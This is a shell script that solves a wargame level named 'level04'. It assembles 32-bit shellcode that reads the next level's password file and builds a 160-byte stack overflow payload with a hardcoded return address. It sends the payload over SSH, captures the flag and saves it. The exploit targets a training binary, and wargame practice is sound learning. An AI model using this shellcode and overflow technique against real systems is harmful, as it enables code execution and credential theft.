#!/usr/bin/env sh

### GLOBALS ###

CURR_DIR_PATH="$(cd "$(dirname "$0")" && pwd)";

### SOURCES ###

. "$CURR_DIR_PATH/../../common/ssh/ssh_session.sh";
. "$CURR_DIR_PATH/.sshid.sh";

# ##### #
# UTILS #
# ##### #

log() {
    echo "[$(date +'%Y-%m-%d %H:%M:%S')] $*";
}

generate_shellcode() {
    asm_path="$1";

    if [ -z "$asm_path" ]; then
        log "Error: generate_shellcode requires an assembly source path.";
        return 1;
    elif [ ! -r "$asm_path" ]; then
        log "Error: assembly source '$asm_path' is not readable.";
        return 1;
    fi

    trap '[ -n "$tmpdir" ] && rm -rf "$tmpdir"' EXIT INT TERM HUP QUIT;
    tmpdir=$(mktemp -d) || return 1;

    nasm -f elf32 "$asm_path" -o "$tmpdir/exploit.o" || return 1;
    ld -m elf_i386 -e _start "$tmpdir/exploit.o" -o "$tmpdir/exploit.bin" || return 1;
    objcopy -j .text -O binary "$tmpdir/exploit.bin" "$tmpdir/shellcode.bin" || return 1;

    shellcode=$(hexdump -v -e '"\\" 1/1 "%03o"' "$tmpdir/shellcode.bin");
    printf "%s" "$shellcode";

    rm -rf "$tmpdir";
    trap - EXIT INT TERM HUP QUIT;
    unset tmpdir shellcode asm_path;
    return 0;
}

# #### #
# MAIN #
# #### #

main() {
    # /!\ $host $port $username and $sshid_password are defined in the source '.sshid.sh' file.
    flag=""

    # Payload(s)

    shellcode="$(generate_shellcode './data/shellcode.asm')"; # \061\300\120\150\160\141\163\163\150\060\065\057\056\150\145\166\145\154\150\162\163\057\154\150\057\165\163\145\150\150\157\155\145\150\057\057\057\057\211\343\061\311\061\322\260\005\315\200\211\301\061\333\263\001\061\322\061\366\116\061\300\260\273\315\200\061\333\263\001\061\300\260\001\315\200
    shellcode_length="$(printf '%b' "$shellcode" | wc -c)"; # 75

    if [ "$shellcode_length" -ne "75" ]; then
        log "Error: the generated shellcode didn't match the expected length in bytes.";
        return 1;
    fi

    octal_le_ret_addr='\134\336\377\377';
    octal_le_buffer_addr='\300\335\377\377';
    hex_be_ret_addr='0xffffde5c';
    hex_be_buffer_addr='0xffffddc0';
    
    ret_addr_length="$(printf '%b' "$octal_le_ret_addr" | wc -c)";

    total_payload_length='160';
    payload_padding_length="$((total_payload_length - shellcode_length - ret_addr_length))";

    payload_padding="$(printf '%*s' "$payload_padding_length" '' | tr ' ' 'A')";
    payload="$(printf '%b%s%b' "$shellcode" "$payload_padding" "$octal_le_buffer_addr")"

    # Resolution

    log "Authenticating to SSH server at $host:$port with username '$username'...";
    SSHPASS="$(sshid_password)" ssh_initialize_socket "$host" "$port" "$username" || { log "Error: Failed to initialize SSH socket."; return 1; };
    flag=$(printf '%s' "$payload" | ssh_exec_via_socket "$host" "$port" "$username" "env -i ~/level04 2>/dev/null" | grep -oE '^[A-Za-z0-9]+$');
    ssh_destroy_socket "$host" "$port" "$username" || { log "Error: Failed to destroy SSH socket."; return 1; };

    if [ -z "$flag" ]; then
        log "Error: flag is empty. Something went wrong.";
        return 1;
    fi

    flag_path="$CURR_DIR_PATH/../flag";
    printf '%s' "$flag" > "$flag_path";
    log "Flag '$flag' has been written to '$flag_path'";
}

main "$@";
